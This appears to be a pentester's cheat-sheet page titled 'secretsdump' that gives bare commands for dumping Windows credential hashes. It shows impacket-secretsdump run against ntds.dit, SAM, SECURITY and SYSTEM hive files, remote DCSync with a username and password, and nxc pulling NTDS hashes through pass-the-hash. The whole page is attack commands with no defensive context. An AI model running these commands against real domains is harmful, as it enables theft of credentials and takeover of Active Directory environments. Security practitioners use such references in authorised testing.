---
title: "secretsdump"
date: 2024-7-2
tags: ["secretsdump", "impacket", "active directory", "ad", "domain controller", "Windows", "ntds.dit", "hive", "hashes", "nxc"]
---

---
### With ntds.dit and SYSTEM hive

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### With SAM, SYSTEM and SECURITY Hives

```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### With dcsync right

#### impacket-secretsdump

```bash
impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
```

#### nxc

```bash
nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds
```

<br>